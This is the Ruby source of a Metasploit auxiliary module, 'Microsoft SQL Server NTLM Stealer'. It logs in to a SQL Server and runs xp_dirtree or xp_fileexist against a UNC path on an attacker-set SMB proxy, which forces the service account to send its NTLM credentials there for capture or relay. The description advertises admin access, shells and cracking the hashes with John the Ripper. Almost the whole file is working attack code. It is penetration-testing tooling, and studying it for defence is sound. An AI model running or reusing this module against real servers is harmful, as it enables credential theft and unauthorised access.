require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::MSSQL

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server NTLM Stealer',
			'Description'    => %q{
				This module can be used to help capture or relay the LM/NTLM 
				credentials of the account running the remote SQL Server service.  
				This module will use the supplied credentials to connect to the 
				target SQL Server instance and execute the xp_dirtree or xp_fileexist
				stored procedure using the specified SMBProxy IP. This should force the SQL 
				Server service account to authenticate to the SMBProxy IP.  In 
				order for the attack to be successful the smb_sniffer or smb_relay module 
				must be running on the system configure with the SMBProxy IP optinos.  Successful 
				execution of this attack usually results in local administrative access 
				to the Windows system. The database account used to connect to the 
				database should only require the "PUBLIC" role.  This works great
				for relaying shared service accounts between SQL Servers to get shells.  
				However ,if the relay fails, then the LM hash can be reversed using the Halflm 
				rainbow tables and john the ripper. Thanks to "Sh2kerr" who wrote the 
				ora_ntlm_stealer for the inspiration.  
			},
			'Author'         => [ 'Scott Sutherland [at] netspi [dot] com>' ],
			'License'        => MSF_LICENSE,
			'Platform'      => [ 'Windows' ],
			'References'     => [[ 'URL', 'http://www.netspi.com/blog/author/ssutherland/' ]],
		))

		register_options(
			[
				OptString.new('SMBPROXY', [ true, 'IP of SMB proxy or sniffer.', '0.0.0.0']),
			], self.class)
	end

	def run
		
		## Warning
		print_status("DONT FORGET to run a SMB capture or relay module!")

		## Set verbosity level
		verbose = datastore['verbose'].to_s.downcase 
		
		## Set status
		
		## Set SMB Proxy
		smbproxy = datastore['SMBPROXY']
			
		## Set default result
		result = 0
		
		## Attempt xp_dirtree and xp_fileexist
		result = exec_unc_xp_dirtree(smbproxy,rhost,rport)
		
		if result == 0 then 			
			result = exec_unc_xp_fileexist(smbproxy,rhost,rport)
		end
		
		## Display status to user
		if result == 1 then 
			print_good("Execution complete, go check your SMB relay or capture module!")
		else
			print_error("Module failed to initiate authentication to smbproxy.")
		end
	end
	
	
	## -------------------------------------------
	## METHOD TO FORCE SQL SERVER TO AUTHENTICATE 	
	## TO UNC PATH - xp_dirtree
	## -------------------------------------------
	def exec_unc_xp_dirtree(smbproxy,vic,vicport)
		
		print_status("Forcing SQL Server at #{vic} to auth to #{smbproxy} via xp_dirtree...")
		
		## EXECUTE QUERY
		sql = "xp_dirtree '\\\\#{smbproxy}\\file'"
		
		begin
			result = mssql_query(sql, false) if mssql_login_datastore
			column_data = result[:rows]
			print_good("Successfully executed xp_dirtree on #{rhost}")			
			return 1
		rescue
			print_error("Failed to connect to #{rhost} on port #{rport}")
			return 0
		end	
	end
	
	## -------------------------------------------
	## METHOD TO FORCE SQL SERVER TO AUTHENTICATE 	
	## TO UNC PATH - xp_fileexist
	## -------------------------------------------
	def exec_unc_xp_fileexist(smbproxy,vic,vicport)
		
		print_status("Forcing SQL Server at #{vic} to auth to #{smbproxy} via xp_fileexist...")
		
		## EXECUTE QUERY
		sql = "xp_fileexist '\\\\#{smbproxy}\\file'"		
		
		begin
			result = mssql_query(sql, false) if mssql_login_datastore
			column_data = result[:rows]
			print_good("Successfully executed xp_fileexist on #{rhost}")			
			return 1
		rescue
			print_error("Failed to connect to #{rhost} on port #{rport}")
			return 0
		end	
	end
	
end
